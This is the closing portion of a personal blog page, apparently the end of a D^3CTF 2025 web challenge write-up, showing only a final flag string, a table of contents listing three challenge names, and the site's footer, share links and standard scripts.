+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d3ctf&#123;l-tHINK_w3_H@vE-3NCOUnT3R3D_pO11cy_1nJ3CT10n?l33&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About me</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#d3model"><span class="toc-number">1.</span> <span class="toc-text">d3model</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tidy-quic"><span class="toc-number">2.</span> <span class="toc-text">tidy quic</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3invitation"><span class="toc-number">3.</span> <span class="toc-text">d3invitation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&text=D^3CTF 2025 Web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&is_video=false&description=D^3CTF 2025 Web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=D^3CTF 2025 Web wp&body=Check out this article: http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&title=D^3CTF 2025 Web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&name=D^3CTF 2025 Web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/06/03/D-3CTF-2025-Web-wp/&t=D^3CTF 2025 Web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        Meteor_Kai
+        <br>
+        <a href="https://www.dkdun.cn/" target="_blank">DK盾</a>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">Home</a></li><!--
+                --><!--
+                --><li><a href="/about/">About me</a></li><!--
+                --><!--
+                --><li><a href="/archives/">Writing</a></li><!--
+                --><!--
+                --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+                --><!--
+                --><li><a href="/search/">Search</a></li><!--
+                --><!--
+                --><li><a href="/categories/">categories</a></li><!--
+                --><!--
+                --><li><a href="/tags/">tags</a></li><!--
+                --><!--
+                --><li><a href="/links/">links</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
